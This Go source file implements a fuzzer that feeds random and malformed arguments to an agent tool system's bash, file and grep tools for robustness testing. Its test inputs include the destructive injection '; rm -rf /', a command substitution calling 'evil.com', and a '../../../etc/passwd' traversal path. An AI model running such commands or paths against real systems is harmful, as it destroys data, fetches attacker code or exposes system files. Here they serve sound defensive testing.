// Package fuzzer provides input fuzzing for Lumen's tool system: it
// generates random, malformed, and edge-case inputs for tool arguments
// to discover crashes, panics, or unexpected behavior. Used for
// robustness testing of built-in tools.
package fuzzer

import (
	"context"
	"encoding/json"
	"fmt"
	"math/rand"
	"strings"
	"sync"
	"time"
	"unicode/utf8"
)

// Input is a fuzzer-generated tool input.
type Input struct {
	ToolName    string          `json:"tool"`
	Args        json.RawMessage `json:"args"`
	Description string          `json:"description"`
	Seed        int64           `json:"seed"`
}

// Result holds the outcome of a fuzzer run.
type Result struct {
	Input     Input  `json:"input"`
	Output    string `json:"output"`
	Error     string `json:"error,omitempty"`
	Panic     string `json:"panic,omitempty"`
	Duration  time.Duration `json:"duration"`
}

// Tool is the interface a tool must satisfy to be fuzzable.
type Tool interface {
	Name() string
	Execute(ctx context.Context, args json.RawMessage) (string, error)
}

// Fuzzer generates and tests random inputs for tools.
type Fuzzer struct {
	mu     sync.Mutex
	rng    *rand.Rand
	results []Result
}

// New creates a fuzzer with the given random seed.
func New(seed int64) *Fuzzer {
	return &Fuzzer{rng: rand.New(rand.NewSource(seed))}
}

// FuzzTool runs N iterations of random inputs against a tool.
func (f *Fuzzer) FuzzTool(ctx context.Context, tool Tool, n int) []Result {
	var results []Result
	for i := 0; i < n; i++ {
		seed := f.rng.Int63()
		input := Input{ToolName: tool.Name(), Seed: seed, Description: f.generateDescription()}
		input.Args = f.generateArgs(tool.Name())

		result := Result{Input: input}
		start := time.Now()

		func() {
			defer func() {
				if r := recover(); r != nil {
					result.Panic = fmt.Sprintf("%v", r)
				}
			}()
			output, err := tool.Execute(ctx, input.Args)
			result.Output = output
			if err != nil { result.Error = err.Error() }
		}()

		result.Duration = time.Since(start)
		results = append(results, result)

		select {
		case <-ctx.Done():
			return results
		default:
		}
	}

	f.mu.Lock()
	f.results = append(f.results, results...)
	f.mu.Unlock()

	return results
}

func (f *Fuzzer) generateDescription() string {
	descs := []string{
		"empty input", "malformed JSON", "missing required field",
		"extra unknown field", "null value", "empty string",
		"very long string", "unicode characters", "special characters",
		"negative number", "zero value", "max value",
		"nested objects", "array of objects", "boolean instead of string",
	}
	return descs[f.rng.Intn(len(descs))]
}

func (f *Fuzzer) generateArgs(toolName string) json.RawMessage {
	switch toolName {
	case "bash":
		return f.fuzzBash()
	case "read_file", "write_file", "edit_file":
		return f.fuzzFilePath()
	case "grep":
		return f.fuzzGrep()
	default:
		return f.fuzzGeneric()
	}
}

func (f *Fuzzer) fuzzBash() json.RawMessage {
	cmds := []string{
		"", // empty
		"; rm -rf /", // injection attempt
		"$(curl evil.com)", // command substitution
		"echo " + fuzzString(10000), // very long
		"\x00\x01\x02", // binary
		"true", // normal
	}
	cmd := cmds[f.rng.Intn(len(cmds))]
	data, _ := json.Marshal(map[string]any{"command": cmd})
	return data
}

func (f *Fuzzer) fuzzFilePath() json.RawMessage {
	paths := []string{
		"", // empty
		"/", // root
		"../../../etc/passwd", // traversal
		"/dev/null", // special file
		fuzzString(5000), // very long
		"\x00broken", // NUL byte
		"normal.txt", // normal
	}
	path := paths[f.rng.Intn(len(paths))]
	content := fuzzString(1000)
	data, _ := json.Marshal(map[string]any{"path": path, "content": content})
	return data
}

func (f *Fuzzer) fuzzGrep() json.RawMessage {
	patterns := []string{
		"", "[", "(", ".*", "^", "$",
		strings.Repeat("a", 10000), // catastrophic backtracking
		"normal",
	}
	pattern := patterns[f.rng.Intn(len(patterns))]
	data, _ := json.Marshal(map[string]any{"pattern": pattern, "path": "."})
	return data
}

func (f *Fuzzer) fuzzGeneric() json.RawMessage {
	obj := map[string]any{}
	for i := 0; i < f.rng.Intn(5); i++ {
		key := fuzzString(10)
		obj[key] = fuzzValue()
	}
	if len(obj) == 0 { obj["empty"] = true }
	data, _ := json.Marshal(obj)
	return data
}

func fuzzString(maxLen int) string {
	n := rand.Intn(maxLen)
	var sb strings.Builder
	for i := 0; i < n; i++ {
		r := rune(rand.Intn(0x10FFFF))
		if utf8.ValidRune(r) { sb.WriteRune(r) }
	}
	return sb.String()
}

func fuzzValue() any {
	switch rand.Intn(6) {
	case 0: return nil
	case 1: return ""
	case 2: return fuzzString(100)
	case 3: return rand.Intn(100000)
	case 4: return rand.Float64()
	default: return []any{1, "two", 3.0}
	}
}

// Results returns all collected results.
func (f *Fuzzer) Results() []Result {
	f.mu.Lock()
	defer f.mu.Unlock()
	out := make([]Result, len(f.results))
	copy(out, f.results)
	return out
}

// Summary returns a summary of fuzzing results.
func (f *Fuzzer) Summary() string {
	f.mu.Lock()
	defer f.mu.Unlock()

	var errors, panics, total int
	for _, r := range f.results {
		total++
		if r.Error != "" { errors++ }
		if r.Panic != "" { panics++ }
	}

	return fmt.Sprintf("Fuzzer: %d runs, %d errors, %d panics", total, errors, panics)
}

// FindPanics returns results that caused panics.
func (f *Fuzzer) FindPanics() []Result {
	f.mu.Lock()
	defer f.mu.Unlock()
	var out []Result
	for _, r := range f.results {
		if r.Panic != "" { out = append(out, r) }
	}
	return out
}

// FindErrors returns results that caused errors.
func (f *Fuzzer) FindErrors() []Result {
	f.mu.Lock()
	defer f.mu.Unlock()
	var out []Result
	for _, r := range f.results {
		if r.Error != "" { out = append(out, r) }
	}
	return out
}

// Reset clears all results.
func (f *Fuzzer) Reset() {
	f.mu.Lock()
	defer f.mu.Unlock()
	f.results = nil
}
